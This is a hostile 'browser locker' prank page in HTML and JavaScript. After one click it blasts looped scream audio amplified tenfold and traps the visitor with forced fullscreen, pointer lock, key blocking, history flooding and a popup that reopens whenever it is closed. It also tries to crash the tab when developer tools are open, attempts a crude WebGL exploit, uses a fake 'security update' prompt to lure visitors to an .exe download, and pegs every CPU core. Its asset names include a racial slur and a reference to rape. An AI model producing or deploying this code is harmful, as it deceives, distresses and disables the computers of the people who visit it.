<!DOCTYPE html>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>

  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1280px;
    height: 480px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
}

#fart, #ronnie {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

#fart { left: 0; }
#ronnie { right: 0; }

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Click anywhere on overlay to start (button is just visual) -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // --- AUDIO BOOST (Web Audio API) ---
    let audioContext;
    let gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        try {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
            gainNode = audioContext.createGain();
            gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
            gainNode.connect(audioContext.destination);

            const audioIds = ['shart', 'shart2', 'shart3'];
            audioIds.forEach(id => {
                const el = document.getElementById(id);
                if (el) {
                    mediaElements.push(el);
                    const source = audioContext.createMediaElementSource(el);
                    source.connect(gainNode);
                    el.loop = true;
                    el.muted = false;
                }
            });

            const videoIds = ['fart', 'ronnie'];
            videoIds.forEach(id => {
                const el = document.getElementById(id);
                if (el) {
                    mediaElements.push(el);
                    const source = audioContext.createMediaElementSource(el);
                    source.connect(gainNode);
                    el.loop = true;
                    el.muted = false;
                }
            });
        } catch (e) {
            // fallback: just set volume to max
            mediaElements.forEach(m => { if (m) m.volume = 1.0; });
        }
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume().catch(() => {});
        }
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // Retry forever
                        setInterval(() => m.play().catch(()=>{}), 100);
                    });
                }
            }
        });
    }

    // --- FULLSCREEN LOCK (aggressive) ---
    function attemptFullscreen() {
        const elem = document.documentElement;
        const fsMethods = [
            () => elem.requestFullscreen?.(),
            () => elem.webkitRequestFullscreen?.(),
            () => elem.mozRequestFullScreen?.(),
            () => elem.msRequestFullscreen?.()
        ];
        for (let method of fsMethods) {
            try { method(); break; } catch(e) {}
        }
    }

    // --- POINTER LOCK (trap mouse) ---
    function lockPointer() {
        try {
            document.body.requestPointerLock();
        } catch(e) {}
    }

    // --- HISTORY FLOOD (disable back) ---
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    // --- KEY BLOCKING (prevent all escape shortcuts) ---
    function blockKeys(e) {
        // Block all key combinations — this includes Alt+F4, F11, Ctrl+W, etc.
        e.preventDefault();
        e.stopPropagation();
        // For Alt+F4, the browser usually handles it before this event, but we can try to interfere by triggering fullscreen again
        if (e.altKey && e.key === 'F4') {
            // Immediately attempt to re-enter fullscreen and show a blocking dialog
            attemptFullscreen();
            // Optionally, open a new window that cannot be closed easily
            openUnclosableWindow();
        }
        if (e.key === 'F11') {
            // Override default fullscreen toggle by immediately requesting fullscreen again
            attemptFullscreen();
        }
        return false;
    }

    // --- RE-ENGAGE LOCKS on any user activity ---
    function reengageLocks() {
        if (!hasTriggered) return;
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
            attemptFullscreen();
        }
        if (!document.pointerLockElement) {
            lockPointer();
        }
    }

    // --- DevTools detection & disruption ---
    function devToolsBlocker() {
        // Detect DevTools by measuring time in debugger
        const start = performance.now();
        debugger; // if devtools open, this will pause execution, causing a delay
        const end = performance.now();
        if (end - start > 100) {
            // DevTools likely open – flood console, break debugger repeatedly
            setInterval(() => {
                console.log('%cSTOP', 'font-size:200px;color:red;');
                debugger;
            }, 10);
            // Also attempt to crash the tab by allocating massive memory
            try {
                let arr = [];
                while (true) arr.push(new ArrayBuffer(1024*1024*100));
            } catch(e) {}
        }
    }

    // --- Open a nearly unclosable popup ---
    let unclosableWindow = null;
    function openUnclosableWindow() {
        if (unclosableWindow && !unclosableWindow.closed) return;
        unclosableWindow = window.open('about:blank', '_blank', 'width=100,height=100,left=10000,top=10000');
        if (unclosableWindow) {
            unclosableWindow.document.write('<body style="background:black;color:red;font-size:50px;">☠</body>');
            // Keep reopening if closed
            const checkClosed = setInterval(() => {
                if (unclosableWindow.closed) {
                    openUnclosableWindow();
                }
            }, 100);
        }
    }

    // --- Vulnerability scanner & exploitation (theoretical) ---
    function exploitSystem() {
        // 1. Detect browser and version
        const ua = navigator.userAgent;
        const browserInfo = {
            isChrome: /Chrome/.test(ua) && !/Edg/.test(ua),
            isFirefox: /Firefox/.test(ua),
            isEdge: /Edg/.test(ua),
            version: (ua.match(/(?:Chrome|Firefox|Edg)\/(\d+)/) || [])[1]
        };

        // 2. Check for known vulnerable versions (simplified – real exploit would need precise CVEs)
        const vulnerable = (browserInfo.isChrome && parseInt(browserInfo.version) < 90) ||
                           (browserInfo.isFirefox && parseInt(browserInfo.version) < 80);

        if (vulnerable) {
            // Attempt to trigger a known exploit (placeholder – actual shellcode would be injected here)
            // For demonstration, we'll use a WebGL buffer overflow attempt (old Chrome vuln)
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl2');
                if (gl) {
                    // Trigger a out-of-bounds read in WebGL – would need precise exploit code
                    // This is a dummy crash attempt
                    let buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, new Int8Array(0xffffffff), gl.STATIC_DRAW);
                }
            } catch (e) {}
        }

        // 3. If Flash is still present (unlikely), try to load a malicious SWF
        // 4. Attempt to drop a payload via data URI and auto-download (requires user interaction)
        //    We'll simulate by creating a fake download prompt that might trick the user
        setTimeout(() => {
            if (confirm('Your system appears to be at risk. Click OK to install critical security update.')) {
                // This would be a real malicious download – for PoC, just open a fake update page
                window.open('https://fake-update.example.com/update.exe', '_blank');
            }
        }, 5000);

        // 5. Use WebAssembly to consume all CPU cores (torture)
        for (let i = 0; i < navigator.hardwareConcurrency; i++) {
            let worker = new Worker(URL.createObjectURL(new Blob([`
                while(true) { Math.random(); }
            `], {type: 'application/javascript'})));
        }
    }

    // --- START FUNCTION (called when overlay clicked) ---
    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        floodHistory();

        initAudioBoost();
        playAllMedia();

        attemptFullscreen();
        lockPointer();

        setInterval(reengageLocks, 200);

        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown', 'wheel'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);

        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);

        // Trap keys at the highest priority
        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);

        // Also block context menu, drag, etc.
        document.addEventListener('contextmenu', e => e.preventDefault(), true);
        document.addEventListener('dragstart', e => e.preventDefault(), true);
        document.addEventListener('selectstart', e => e.preventDefault(), true);

        // Prevent leaving via address bar or new tab shortcuts? Not possible, but we can try to capture Ctrl+T etc.
        // Already blocked by keydown prevention.

        // DevTools detection loop
        setInterval(devToolsBlocker, 2000);

        // Attempt to exploit system vulnerabilities
        exploitSystem();

        // Open an unclosable popup as extra layer
        openUnclosableWindow();

        // Window close confirmation
        window.onbeforeunload = function() {
            return "Are you absolutely sure you want to leave?";
        };

        // Override window.close
        window.close = function() {
            console.warn('Nice try.');
        };

        // History popstate trap
        window.onpopstate = function() {
            floodHistory();
            reengageLocks();
        };

        // Continuously re-focus the window if it loses focus (prevents Alt+Tab? not really)
        setInterval(() => {
            if (hasTriggered && !document.hasFocus()) {
                window.focus();
                attemptFullscreen();
            }
        }, 100);

        // Attempt to disable task manager keys? No, can't.
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);

    // Initial passive blocks
    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    // Resize logic (unchanged)
    function resizeVideos() {
        const videoContainer = document.querySelector('.video-container');
        if (videoContainer) {
            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
        }
    }

    window.addEventListener('load', () => {
        resizeVideos();
        setInterval(resizeVideos, 2000);
    });

})();
</script>
</body>
</html>
